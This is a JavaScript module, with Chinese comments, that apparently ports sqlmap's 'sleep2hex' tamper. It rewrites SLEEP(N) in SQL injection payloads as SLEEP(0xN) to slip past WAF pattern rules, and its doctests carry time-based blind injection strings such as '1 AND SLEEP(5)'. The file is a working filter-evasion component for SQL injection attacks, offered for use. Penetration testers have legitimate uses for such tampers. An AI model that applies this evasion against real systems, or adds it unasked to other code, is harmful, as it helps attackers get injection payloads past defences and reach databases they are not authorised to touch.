// 对标 sqlmap sleep2hex.py：SLEEP(N) 数字参数转十六进制字面量
// '1 AND SLEEP(5)' -> '1 AND SLEEP(0x5)'，绕过 SLEEP(数字) 形态规则
export const sleep2hex = {
  name: 'sleep2hex',
  description: '将 SLEEP(N) 的数字参数转十六进制（SLEEP(5) → SLEEP(0x5)，绕过形态规则）',
  doctests: [
    { input: '1 AND SLEEP(5)', output: '1 AND SLEEP(0x5)' },
    { input: '1 AND (SELECT SLEEP( 12 ))', output: '1 AND (SELECT SLEEP(0xc))' },
    { input: '1 AND SLEEP(0)', output: '1 AND SLEEP(0x0)' },
    { input: '1 AND 1=1', output: '1 AND 1=1' },
  ],
  transform(payload) {
    return String(payload ?? '').replace(/\bSLEEP\(\s*(\d+)\s*\)/gi, (m, n) => `SLEEP(0x${Number(n).toString(16)})`);
  },
};
export default sleep2hex;
